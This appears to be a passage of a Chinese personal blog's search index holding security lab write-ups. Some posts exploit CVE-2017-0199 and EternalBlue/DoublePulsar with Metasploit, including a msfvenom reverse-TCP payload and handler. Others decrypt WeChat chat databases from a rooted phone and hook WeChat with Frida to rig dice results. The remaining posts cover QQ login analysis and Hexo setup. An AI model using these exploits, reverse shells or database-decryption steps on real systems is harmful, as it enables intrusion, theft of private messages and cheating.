https://raw.githubusercontent.com/nixawk/metasploit-framework/3d082814cbedc065f329498b9c6fb7951f8ebbd5/data/exploits/cve-2017-0199.rtf 开启hta服务123msf &gt; use exploit/windows/misc/hta_servermsf exploit(hta_server) &gt; show optionsmsf exploit(hta_server) &gt; run 生成exploit文档12345msf exploit(hta_server) &gt; use exploit/windows/fileformat/office_word_htamsf exploit(office_word_hta) &gt; show optionsmsf exploit(office_word_hta) &gt; set TARGETURI http://192.168.232.134:8080/4Jmy4cmcZZV7pwi.htamsf exploit(office_word_hta) &gt; set FILENAME msf.docmsf exploit(office_word_hta) &gt; run 将生成的msf.doc文件复制到windows上，打开即可获取一个会话 如下所示 WIndows下结果 Kali下结果 附加如何判断是否收到影响（2017.04.19）新建word文档-&gt;插入-&gt;对象-&gt;对象-&gt;由文件创建在文件名中输入获取的hta链接，并选中链接到文件如果出现如下结果，则说明收到影响 如果仅仅出现下面的弹窗，则说明不瘦影响，就不需要接下来的测试了。。 主机和虚拟机镜像采用的同一套系统，Office用的也一样，但是虚拟机不可以，而主机可以。我也不知道为啥···· 参考文章http://rewtin.blogspot.nl/2017/04/cve-2017-0199-practical-exploitation-poc.html?m=1https://github.com/rapid7/metasploit-framework/pull/8254","tags":"cve-2017-0199 office漏洞 msf"},{"title":"方程式漏洞利用之SMB","url":"/2017/04/15/方程式漏洞利用之SMB/","text":"测试过程中发现了许多问题，导致不成功，记录一下过程以及在其中遇到问题的解决方法 环境搭建 主机 IP 备注 Win7 64位 192.168.232.133 靶机（开启smb） XP 192.168.232.128 攻击机1 Kali 192.168.232.134 攻击机2 攻击机软件安装1.下载https://github.com/x0rz/EQGRP_Lost_in_Translation/tree/master/windows2.安装Python2.6 32位 安装后，运行fb.py，发现错误ImportError: No module named win32pipe 搜索后提示需要安装pywin32-216.win32-py2.6.exe，下载地址https://sourceforge.net/projects/pywin32/files%2Fpywin32/选择对应的版本。结果又发现错误 切换到Python的安装目录的Scripts下，执行命令pywin32_postinstall.py -install 运行fb.py报错，在fb.py同目录下创建listeningposts文件夹即可 验证过程运行fb.py后输入靶机和攻击机XP的IP，新建或者用之前的项目之后一路回车，需要操作的地方已经标记选择SMB工具模块，使用命令use Eternalblue选择目标系统输入命令use Doublepulsar 在Kali上生成dll文件，命令如下1msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.134 LPORT=5555 -f dll &gt; s.dll 然后copy到XP系统中，记下位置，如C:\\s.dllkali上运行msf，具体命令如下12345678msf &gt; use exploit/multi/handlermsf exploit(handler) &gt; set LHOST 192.168.232.134LHOST =&gt; 192.168.232.134msf exploit(handler) &gt; set LPORT 5555LPORT =&gt; 5555msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcpPAYLOAD =&gt; windows/x64/meterpreter/reverse_tcpmsf exploit(handler) &gt; exploit 在XP上输入dll文件的位置，一路回车显示Doublepulsar Succeeded 查看kali上发现已经反弹shell 了 结束语现在网上已经有很多文章了，这里只是自己验证一下实现的过程，记录一下。其实复现也很容易，只需要输入IP地址和一些选项即可，就是搭建环境的时候有许多错误，注意一下就行了。这里有视频可以看一下https://v.qq.com/iframe/player.html?vid=g0393qtgvj0&amp;tiny=0&amp;auto=0","tags":"方程式 smb漏洞"},{"title":"QQ登录简单分析，附易语言登录代码","url":"/2017/04/10/QQ登录简单分析，附易语言登录代码/","text":"这里参考了QQ登录的组件1http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm QQ登录有两种情况，一种是需要验证码，一种是不需要验证码。需要验证码的稍微复杂一点，这里首先介绍一下不需要验证码的情况。 一、无需验证码第一步：获取 login_sig这是登录所需要的第一步，无论是否需要验证码，都需要进行这一步。访问如下地址：1http://ui.ptlogin2.qq.com/cgi-bin/login?hide_title_bar=0&amp;low_login=0&amp;qlogin_auto_login=1&amp;no_verifyimg=1&amp;link_target=blank&amp;appid=636014201&amp;target=self&amp;s_url=http%3A//www.qq.com/qq2012/loginSuccess.htm 从返回的Cookie中获取 pt_login_sig的值，这个值就是login_sig 第二步：获取 checkVC这个字符串中包含了多个内容。有是否输入验证码的标志、verifycode、salt和pt_verifysession_v1（不需要输入验证码的情况下）。请求地址： 1http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=QQ号码&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKS********T0U0npqlnD4bzXEMed&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.23528769960244944&amp;pt_uistyle=40 其中参数uin是登录的qq号码，login_sig是从第一步获取的值。当然这种情况是在QQ号输入正确，并且不需要输入验证码时。返回的内容如下：1ptui_checkVC(&apos;0&apos;,&apos;!BAF&apos;,&apos;\\x00******\\x64\\x21\\x97\\x92&apos;,&apos;e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&apos;,&apos;2&apos;); 第一个值表示是否需要图片验证码，0表示不需要 第二值是verifycode，登录时需要 第三个值是salt，QQ转换而来 第四个值是pt_verifysession_v1 第三步：登录输入密码后点登录，请求包为：1http://ptlogin2.qq.com/login?u=QQ号码&amp;verifycode=!BAF&amp;pt_vcode_v1=0&amp;pt_verifysession_v1=e9825f1e232302e01414bf9c37ac7d44942a40c89daaf5604ab11d54fff32445ad89e315e30a610e0aa77f46afedbaad83819c14230e7ec2&amp;p=w79Tqqx2glOF9meNNWhz5Ouow23EGt3zEl-y8vpVGFuHT6HJaFtRhVDlbpMj4a6plyrnIvW73uGXzVDwSt2e9wMHyFt9crtZ-N0xUx2wxFUen03ybw5HxzkPti3VyjSffID8GNkhDn1yYVPa1lyjHED2DCVd3rl9bysBPb*1imLSYY3jkQJpsXPS2kjxxlVxFBVHEHnSGSYaA3QBMXQ*NyQw7MkhVDsO7X8aljR0eApa*lgHoBsC4g3mTtEKcU5aslpcO4EPdUey0QA4YVh9zLzbLnkPJklcQYvoxlv6kLdYmoyORcVTM6IKqles7t5ot0mRWzjW923hV3X0PLRb6g__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=4-8-1488010172151&amp;js_ver=10197&amp;js_type=1&amp;login_sig=GsmtnCcla5xHKSrRZ7ek0VU5-63oyUvqLk65vxoIG0kOFBT0U0npqlnD4bzXEMed&amp;pt_uistyle=40&amp;aid=636014201&amp; 参数名称 说明 u 用户输入。第二步骤中 uin的值 verifycode 第二步中ptui_checkVC第二个值。(这里的是!BAF) pt_verifysession_v1 第二步中ptui_checkVC第四个值。即e9825f1…. p 加密后的密码 login_sig 第一步中返回Cookie中的 pt_login_sig值 pt_randsalt pt_randsalt=0 旧版加密 ；pt_randsalt=2 新版RSA加密 密码加密的js代码地址http://imgcache.qq.com/ptlogin/ver/10197/js/c_login_2.js，注意看js版本，这里是js_ver为10197 密码加密需要三个参数，第一个是pwd（用户密码），第二个是salt（第二步中获取ptui_checkVC 中的第三个值），第三个是verifycode（第二步中ptui_checkVC第二个值 ） 用户名密码正确返回：1ptuiCB(&apos;0&apos;,&apos;0&apos;,&apos;http://www.qq.com/qq2012/loginSuccess.htm&apos;,&apos;0&apos;,&apos;登录成功！&apos;, &apos;QQ昵称&apos;); 用户名密码错误返回： 1ptuiCB(&apos;3&apos;,&apos;0&apos;,&apos;&apos;,&apos;0&apos;,&apos;您输入的帐号或密码不正确，请重新输入。&apos;, &apos;&apos;); 附上一张登录成功的截图 二、需要输入验证码第一步：获取login_sig与上面无需验证码一样，就省略了。 第二步：获取cap_cd请求：1http://check.ptlogin2.qq.com/check?regmaster=&amp;pt_tea=2&amp;pt_vcode=1&amp;uin=987654321&amp;appid=636014201&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;r=0.8539291708517738&amp;pt_uistyle=40 返回1ptui_checkVC(&apos;1&apos;,&apos;yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&apos;,&apos;\\x00\\x00\\x00\\x00\\x3a\\xde\\x68\\xb1&apos;,&apos;&apos;,&apos;2&apos;); cap_cd的值为yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w** 第三步：获取sess请求：1http://captcha.qq.com/cap_union_new_gettype?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;callback=_aq_453849 uid是qq号，cap_cd由第二步获取 返回：1_aq_453849(&#123;&quot;capclass&quot;:&quot;0&quot;,&quot;subcapclass&quot;:&quot;0&quot;,&quot;src&quot;:&quot;cap_union_new_show&quot;,&quot;sess&quot;:&quot;XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&quot;&#125;) 第四步：获取visg请求：1http://captcha.qq.com/cap_union_new_show?aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=987654321&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999 第五步：获取图片验证码访问地址：1http://captcha.qq.com/cap_union_new_getcapbysig?aid=549000912&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=” ＋ sess ＋ “&amp;noBorder=noborder&amp;showtype=embed&amp;uid=” ＋ uin ＋ “&amp;cap_cd=” ＋ cap_cd ＋ “&amp;lang=2052&amp;rnd=117715&amp;rand=0.5497459754332915&amp;vsig=” ＋ vsig ＋ “&amp;ischartype=1 第六步：验证验证码，获取verifycode和pt_verifysession_v1post请求：http://captcha.qq.com/cap_union_new_verify?random=1488013134675 提交内容：1aid=636014201&amp;asig=&amp;captype=&amp;protocol=http&amp;clientype=2&amp;disturblevel=&amp;apptype=2&amp;curenv=inner&amp;sess=XiUr_hV-3RVfwQc2_01i1vZOI3BJdVr8AfA3-ZYIFztXD58CSfYICY_kwrJjpmvRtuAfMX50sJGC0c0D8W2kig**&amp;noBorder=noborder&amp;showtype=embed&amp;uid=QQ号码&amp;cap_cd=yrAL1AMRbUpQGrsQxy6HMhVQ1YIf--U0zK5wNm_wTOYi2YIrxt5H5w**&amp;lang=2052&amp;rnd=925999&amp;subcapclass=0&amp;vsig=g3GflfnCicbaqub3e-SVo2azImuo1gDzQfnGkRnhI-uqLlIXtY6XyXE1dDjUBJHOXCPewnnTo-4mPTtRjScTD9uZaPu4z3x1Jj6inepPQ8l8KCeFeN9laBpiWdqaOF4Eg&amp;cdata=0&amp;collect=OD6q9t0AraWJf%2Bdtq0j8VvuOrjmT8T%2F%2FW8E83RE208unUG0TO1T5psMsZH1p5SXS12WpjU2CcGKHMsp7fciMTLiLY3wUwJBjBxWSqfu%2FbhfCTKUtJdBPeE6P%2FsRfdwemWRYRQwRgdvXZuc42JOqfDIfD%2F2%2B2GeYYxOPohbqY%2BWcW%2Fcut%2BGLcKpJGFTzBtPzKDLU6fTPn6MC%2FNiRGWGehwTy52MK0dIVdd5BYlPQrhFrvrhaisRISHiH%2FhViF7iFpZm5ZclBD5rjqQ4r1O8%2BBDRSB4feMaP2S1Usd0uGrMnVFT8zX7dV7sT2Y1NQ%2Fk5%2FHP%2BgzBQgHMLuH%2FqdSBz%2Fu9wr7oT6Xb0edOUBjPrw55yhZM1R%2FxEJSNwap2f77XRxbJWH%2BFtEuWBC2Gve3MIn9L9loCqk%2Fe0XoGGy%2FuEDvHfEHRCchzaWKH3Hlr5MehOI4WaaPgmbj%2BBeSbcY%2BmDIc1TJ%2BhQmsRf5DoqlqiCuKNQLuX1XS1e3cnfM3%2BonkBImxaqx%2BlTG0HxWAV0Ntsn%2B0%2BeErZleVNI9VIZgIOHDxNkiaG3BucPL1SRuPNtgcNgGFpvYmFqTqPrR%2FgYDPobzlxy%2FcMVEALYB%2FogbH4gy%2FZP7xczjXypgdvtTawokxTUopmKyXVCwvA0coEQzWLW1EQfMsWPNZcA2p58oaelGA3FBlgkZ2iUnx4qukKEZQ7vKFie8VKFBelfNSp6aXcezYbnDbeFHYOAvLeXPriaZ5qBQzNADUtyj%2FhTsY%2BbvmnwCAGT%2F%2BMYeyd9VFWPEbR8cj%2FrRDEEWc0wdd5BOoHzix%2Bz2Uif9512VwHn9%2Bp3KXAnrK1O%2FQ6HRB7YS9BPyYQvW9ZtpvvKBwOIjf3fx7aqwYqfa7VUzMGv3zkvVA8Bp2JHG2GoQxnVa62ymP3SGshxS4l86ParjFNvepN16O1VaPAidFvqHRXAP14tHMkeC8VTFuqp5cKAY4UdXpPXukOvXPySbdFSPaaAqfIv7%2BckjxFsUPS4cauOx2jif2fQU2maxErLnwrZ10natNklynu5sUn9RSuRDld9v4TNTbyPShDdijM%2BzvpJoMyr4GWiFthB0kZZ2lVnPoqV67VQ%2FPiyCUA9zVbrLSAEOKIz1HQ19I0hdH41fBUPL824xYMdIO1AlZJKGre%2FCvUEgXaHgvbe83QNtFw%2BU946tlGVwR9TCCPltakqyKrT%2F8CtCZ6Mi0qfmFYnF8D7zZBaKxbNgTmMjvwAyz%2F0dMsDi97scJLMYV4w%2Fosk6gvoHEeX6LkbXh5W0aTYTznTSfO2RVfgzWpPiks6rVGzLhfwDyFAyH7%2FOHD7qEWGjnX3fTiBnw5%2FHWqHPJh3Kd%2F4EGe1yE3ZGzxo%2BPETGbcLQaQiiSAaQiFsU5UDoWG1%2FfOjd1Lkjg8D%2FNXuS1BkncxI2Hk%2B4xL0Xa1STqWJGieeyB5DOT9cHYUxEpw1g%3D&amp;ans=ywhm 验证码输入正确返回： 1&#123;\"errorCode\":\"0\" , \"randstr\" : \"@mDo\" , \"ticket\" : \"t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*\" , \"errMessage\":\"OK\"&#125; verifycode为randstr，pt_verifysession_v1为ticket 第七步： 验证用户名密码是否正确请求： 1http://ptlogin2.qq.com/login?u=987654321&amp;verifycode=@mDo&amp;pt_vcode_v1=1&amp;pt_verifysession_v1=t026Dii9p2HtKBiYgHwRpwqXFrwWsI3-tta5rc7J3ELr5VgnaORdHXceHsZpmOl6JGRkEQYtUoeJs8KXWym7a0cxuw07929umE9cPo16UNyimo*&amp;p=A*CEx2PsoaZAYQe7D-5dLmTxdorqI9asO37Wugp2KFHzeEqYpMPh9CHPk7DDzZw5UzD4y1in-ZrSoXLx5kJYe1WGZ7sqhg*ZNJ3DtQ65rXR*I5i*dCAQ-h1fFV*u3AdP8IFAAu*borH*xSYbFZDTQ8TjplD2wan2w8MnDfo3h1AyUL*kpt79FqpCfuXnlaSOyTOzkMceEQczxw5DYzmZDetbMeJMYhoqLhQ0WHxbHUafhOEk1EhBDiqXvfETJvCmSMubGN7W*LIF3JPoYFDOgJmmPWqauGvw7C03ehesfIzeNtm-m5R*QX8HyM4dPp*dc3lRUxF2rMuBPn9EVzaqpg__&amp;pt_randsalt=2&amp;u1=http%3A%2F%2Fwww.qq.com%2Fqq2012%2FloginSuccess.htm&amp;ptredirect=0&amp;h=1&amp;t=1&amp;g=1&amp;from_ui=1&amp;ptlang=2052&amp;action=5-24-1488013134992&amp;js_ver=10197&amp;js_type=1&amp;login_sig=KVSX9JmFKqCXlNi85SLXJnj5DqKPDzAYGwW3X5d3Wcnxd885YPFSeDU7ul15aTQp&amp;pt_uistyle=40&amp;aid=636014201&amp; 带验证码登录可能存在问题，待修改 易语言实现代码","tags":"qq登录 易语言"},{"title":"微信聊天记录读取","url":"/2017/04/09/微信聊天记录读取/","text":"根据四哥教程来自己动手实现一下如何读取微信的聊天记录。以下操作需要在手机Root的情况下进行。 微信聊天记录保存位置微信聊天记录的数据库文件保存在/data/data/com.tencent.mm/MicroMsg/32位字符串/中，名字为EnMicroMsg.db。 将聊天记录数据库文件导出使用命令：1adb pull /data/data/com.tencent.mm/MicroMsg/32位字符串/EnMicroMsg.db 直接导出提示不存在，因为是权限的问题。使用adb root没反应，只好将文件copy到一个非root权限可以操作的目录，这里采用了/data/local/tmp文件夹。1cp EnMicroMsg.db /data/local/tmp/ 然后导出，执行命令adb pull /data/local/tmp/EnMicroMsg.db 提示权限不足，修改权限后导出。 查看SharedPreferences中保存的UIN的值切换到/data/data/com.tencent.mm/shared_prefs目录，然后执行grep -rn &quot;uin&quot; *来查看保存的UIN的值 读取微信数据库文件内容将手机的IMEI和微信用户UIN值进行拼接后进行md5加密，取小写md5的前七位就是微信数据库的密码。用Navicat读取数据库文件是提示错误：这是因为微信数据库用的是SQLCipher开源库提供的加密解密算法，读取数据库文件需要使用SQLCipher这个软件。打开后输入密码，即可看到聊天内容： 参考资料http://blog.csdn.net/jiangwei0910410003/article/details/52238891","tags":"微信聊天记录"},{"title":"Android HOOK 技术之Frida的初级使用","url":"/2017/04/01/Android-HOOK-技术之Frida的初级使用/","text":"Frida是一款基于Python + JavaScript 的Hook与调试框架，在Android\\Linux\\Windows等平台均能使用。这里我们以Windows来对Android应用程序进行Hook。Frida的官网地址是：https://www.frida.re。 Windows下Frida的安装 有多种安装方法，这里提供两种，第一种直接使用pip安装，第二种是下载egg文件安装 1.通过pip安装Frida1pip install frida 2.去下载对应平台的egg安装包进行安装下载地址：https://pypi.python.org/pypi/frida当前最新版本为9.1.23，下载对应平台和Python版本的安装包，例如我的系统为Win64，Python为2.7，下载的文件为frida-9.1.23-py2.7-win-amd64.egg。下载后安装即可。 由于网络原因，方法1安装时间太久，这里推荐第二种方法。 安装完成后在Dos窗口输入命令：1frida-ps 出现类似以下的界面表示安装成功。 Android下Frida环境的搭建 要求：一部Root过的手机或模拟器，最好采用4.4 ARM系统。PS：我真机采用的是魅族4的5.1系统，有些功能实现不了，只好用模拟器来完成。模拟器的具体配置如下图所示。 首先需用下载最新的frida-server，下载地址为：http://build.frida.re/frida-snapshot/android/arm/bin/frida-server。下载后将文件上传到手机中，并赋予执行权限。上传到手机使用如下命令：1adb push frida-server /data/local/tmp/ 将frida-server赋予执行权限，命令如下：1234adb shellsucd /data/local/tmp/chmod 777 frida-server 运行Frida-Server1./data/local/tmp/frida-server 执行frida-ps -U可以看到手机上的进程 使用frida-ps -R 也可以，但是需要进行转发。执行adb forward tcp:27042 tcp:27042后执行frida-ps -R也可以看到手机上的进程 至此，准备工作已经做好，现在来进行对Android上的程序进行Hook了。首先以WX的掷骰子和猜拳头为例。这里采用最新版的WX（6.5.7）。其代码如下所示：123456789101112131415161718192021222324252627282930313233# -*- coding: utf-8 -*import frida, sysdef on_message(message, data): if message['type'] == 'send': print(\"[*] &#123;0&#125;\".format(message['payload'])) else: print(message)jscode = \"\"\"Java.perform(function () &#123;var be= Java.use(\"com.tencent.mm.sdk.platformtools.bf\");send(\"start\")be.da.implementation = function()&#123; var type = arguments[0]; send(type);//5表示掷骰子，2表示猜拳头 if(type ==2)&#123; return 1;//表示是石头 &#125;else&#123; return 5;//骰子6点 &#125;&#125;;send(\"end\")&#125;);\"\"\"process = frida.get_usb_device().attach('com.tencent.mm')script = process.create_script(jscode)script.on('message', on_message)print('[*] weixin Start...')script.load()sys.stdin.read() 手机上打开微信后，运行代码。然后点击掷骰子，可以看到都是6点，猜拳头全部是石头。 下面来用一个例子来介绍一下，如何来通过Hook的方法修改原来的内容，以及当出现相同方法名时，如何对该方法进行Hook。其Android的Activity代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465package com.test.fridatest;import android.app.Activity;import android.os.Bundle;import android.util.Log;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;public class MainActivity extends Activity &#123; private Button myButton1; private String TAG = \"fuping\"; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); myButton1 = (Button) findViewById(R.id.button1); myButton1.setOnClickListener( new ButtonClick()); &#125; class ButtonClick implements OnClickListener &#123; public void onClick(View v) &#123; switch (v.getId()) &#123; case R.id.button1: int nRet = test(4); String strRet = nRet + \"\"; Toast.makeText(MainActivity.this, strRet,Toast.LENGTH_LONG).show(); Log.i(TAG, \"test(int):\"+ strRet); strRet = test(4,2)+\"\"; Log.i(TAG, \"test(int,int):\"+ strRet); strRet = test(4,\"2\")+\"\"; Log.i(TAG, \"test(int,String):\"+ strRet); strRet = change(4,\"2\")+\"\"; Log.i(TAG, \"change(int,String):\"+ strRet); break; default: break; &#125; &#125; &#125; public int test(int num) &#123; int nRet = num*2; return nRet; &#125; public int test(int num,int b) &#123; int nRet = num*2 + b ; return nRet; &#125; public String test(int num,String b) &#123; String nRet = num*2 + b ; return nRet; &#125; public String change(int num,String b) &#123; String nRet = num*2 + b ; return nRet; &#125; &#125; 首先演示一下对change方法的hook。hook之前change方法输出的结果为82，预期Hook之后输出的结果应该为164。在真机上运行结果如下所示： 发现Hook之后返回的是null，而且报错。（经过多次给手机系统升级或降级，都无法成功，最后之后在模拟器上测试了） 在模拟器上进行Hook后，出现了预期的结果。在对test方法进行hook时，由于有多个test方法，所以在进行Hook时，需要指定是哪个方法。例如对String test(int num,String b)进行hook时，可以使用如下代码12345var TM = Java.use(\"com.test.fridatest.MainActivity\");TM.test.overload(\"int\",\"java.lang.String\").implementation = function (a,b) &#123; send(\"Called - test(int,String):\"+a+\"----\"+b); return this.test.overload(\"int\",\"java.lang.String\").call(this,8,\"3\");&#125;; 附上对test和change同时hook 的结果： 就个人而言，针对Frida和Xposed相比，Frida操作更简单，而且不需要重启手机。但相关资料较少，还是需要慢慢学习。 参考资料 https://www.frida.re/docs/examples/android/ https://www.codemetrix.net/hacking-android-apps-with-frida-1/ http://www.cnblogs.com/konf/p/5998785.html","tags":"安卓hook frida 摇骰子"},{"title":"Hello World","url":"/2017/03/20/hello-world/","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new blog1$ hexo init Create a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment Question运行hexo server，浏览器输入http://localhost:4000 无法访问 产生原因可能是端口占用。 Windows下运行命令netstat -ano | findstr 4000，看是否有有进程占用了4000端口。 这是安装了福昕PDF阅读器的原因，将Foxitprotect.exe进程结束即可。 安装主题1git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia 修改hexo根目录下的 _config.yml ： theme: yilia 之后运行12hexo ghexo s 修改头像hexo根目录下source文件夹中新建assets\\img文件夹，将头像文件复制进去修改主题目录中的_config.yml ：avatar: /assets/img/avatar.jpg 添加标签1.添加标签1tag: 标签 2.添加多个标签1tags: [标签1,标签2,标签3] 或者：123tags: - 标签1 - 标签2 文章部分显示使用&lt;!-- more --&gt;标签来隐藏其下面的内容~","tags":"教程 主题"},{"title":"搜索","url":"/search/index.html","text":"","tags":""},{"title":"404 Not Found：该页无法显示","url":"//404.html","text":".article-header { padding: 0; padding-top: 26px; border-left: none; text-align: center; } .article-header:hover { border-left: none; } .article-title { font-size: 2.1em; } strong a { color: #747474; } .article-meta { display: none; } .share { display: none; } .ds-meta { display: none; } .player { margin-left: -10px; } .sign { text-align: right; font-style: italic; } #page-visit { display: none; } .center { text-align: center; height: 2.5em; font-weight: bold; } .article-entry hr { margin: 0; } .pic { text-align: center; margin: 0; } .pic br { display: none; } #container .article-info-post.article-info { display: none; } #container .article .article-title { padding: 0; }","tags":""},{"title":"分类 & 标签","url":"/tags/index.html","text":"","tags":""},{"title":"关于我","url":"/about/index.html","text":"新浪微博: http://weibo.com/442415405GitHub: https://github.com/fupingleeTwitter: https://twitter.com/fupinglee","tags":""}]}